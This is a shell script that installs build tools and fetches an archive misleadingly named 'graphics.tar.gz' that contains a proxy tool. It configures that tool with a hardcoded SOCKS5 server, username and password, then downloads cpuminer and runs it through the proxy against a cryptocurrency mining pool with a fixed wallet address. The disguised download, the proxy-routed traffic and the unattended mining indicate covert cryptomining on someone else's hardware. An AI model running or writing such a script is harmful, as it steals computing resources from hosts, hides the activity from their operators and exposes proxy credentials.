#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233 
loglevel = 1 
select_proxy_mode=socks5_only 
socks5 = 103.253.24.243:8080
socks5_username = woiden_aqua1
socks5_password = chain
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower  -o stratum+tcps://51.79.177.216:17017 -u web1q7ls09p5rnrjy0s2pz4wpg9gyyqqmjweu936h6e.bor -t 10
